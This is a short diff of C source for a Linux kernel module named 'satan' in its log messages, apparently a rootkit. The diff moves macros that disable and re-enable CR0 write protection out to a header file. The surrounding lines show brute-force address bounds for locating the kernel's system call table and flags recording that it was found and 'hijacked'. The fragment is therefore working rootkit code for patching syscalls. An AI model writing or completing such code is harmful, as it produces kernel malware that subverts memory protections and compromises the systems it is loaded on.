@@ -4,20 +4,10 @@
 #include <linux/kallsyms.h>
 #include <linux/module.h>
 
+#include "util.h"
+
 #define BRUTEFORCE_ADDR_BEGIN 0xc0000000
 #define BRUTEFORCE_ADDR_END 0xe0000000
-
-#define CR0_WP_DISABLE                                             \
-        do {                                                       \
-                pr_info("satan: disabling cr0 write protection");  \
-                write_cr0(read_cr0() & (~ 0x10000));               \
-        } while (0);
-
-#define CR0_WP_DISABLE_END                                         \
-        do {                                                       \
-                pr_info("satan: enabling cr0 write protection");   \
-                write_cr0(read_cr0() | 0x10000);                   \
-        } while (0);
 
 static bool found_sys_call_table = false;
 static bool hijacked = false;
